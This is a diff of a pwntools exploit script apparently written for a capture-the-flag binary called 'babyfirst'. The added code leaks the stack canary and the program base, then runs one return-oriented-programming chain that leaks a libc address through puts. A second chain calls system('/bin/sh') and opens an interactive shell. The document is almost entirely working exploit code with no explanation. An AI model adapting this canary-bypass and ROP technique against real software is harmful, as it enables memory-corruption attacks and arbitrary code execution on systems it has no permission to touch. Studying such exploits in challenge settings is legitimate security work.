@@ -3,6 +3,7 @@ import time
 
 p=process('./babyfirst')
 elf=ELF('babyfirst')
+libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
 ##ROP find
 rop = ROP('babyfirst')
 try:
@@ -38,33 +39,52 @@ canary=p.recv(8)
 canary=bytearray(canary)
 canary[0]=b'\x00'
 canary=u64(canary)
-# log.info('canary:'+hex(u64(canary)))
 tag('canary',canary)
 time.sleep(0.5)
-# p.sendline(canary)
-# print hex(pop_rdi)
-# print hex(elf.sym['main'])
-# pay1='END'+(0x28-3)*'a'+canary+'#'*10
-pay='a'*(0x38-8)+'\x00'
+
+
+
+## Leak text_base
+pay='b'*(0x30)+'#'*8
 p.send(pay)
-time.sleep(0.5)
+p.recvuntil('########')
 ret=p.recv(8)
-ret=u64(ret.ljust(8,'\x00'))
-# log.info('ret:'+hex(ret))
+ret=bytearray(ret)
+ret[-1]='\x00'
+ret=ret.ljust(8,'\x00')
+ret=u64(ret)
+
 tag('ret',ret)
-text_base=ret-0xfb1
+time.sleep(0.5)
+text_base=ret-0xf8d
 tag('text_base',text_base)
-Play=text_base+elf.sym['Play']
-tag('Play',Play)
-# time.sleep(0.5)
-# p.recvuntil('ret')
-# ret=p.recv(8)
-# log.info('ret: '+ret)
-p.sendline('END'+cyclic(0x28-3)+p64(canary)+'a'*8+p64(Play))
-# p.sendline('END')
-# p.send(canary)
-# p.send(cyclic(0x28)+canary+'a'*200)
-# p.sendline('2')
-# p.sendline(cyclic(0x28)+"\x00"+canary+cyclic(200))
+time.sleep(0.5)
+
+## ROP1 leak libc
+rdi=pop_rdi+text_base
+puts=text_base+elf.sym['puts']
+puts_got=text_base+elf.got['puts']
+main = text_base+elf.sym['main']
+
+log.info('ROPPING1...')
+sleep(2)
+rop1='END'+ cyclic(0x28-3)+p64(canary)+'a'*8+p64(rdi)+p64(puts_got)+p64(puts)+p64(main)
+p.sendline(rop1)
+p.recvuntil('~~')
+leak=p.recv(7)
+leak=u64(leak.ljust(8,'\0'))
+tag('leak',leak)
+libc_base=leak-libc.sym['puts']
+tag('libc_base',libc_base)
+
+## ROP2 get shell
+p.sendline('2')
+time.sleep(0.5)
+log.info('ROPPING2...')
+sleep(2)
+sys=libc_base+libc.sym['system']
+bin_sh=libc_base+libc.search('/bin/sh').next()
+rop2='END'+ cyclic(0x28-3)+p64(canary)+'a'*8+p64(rdi)+p64(bin_sh)+p64(sys)+p64(main)
+p.sendline(rop2)
 
 p.interactive()
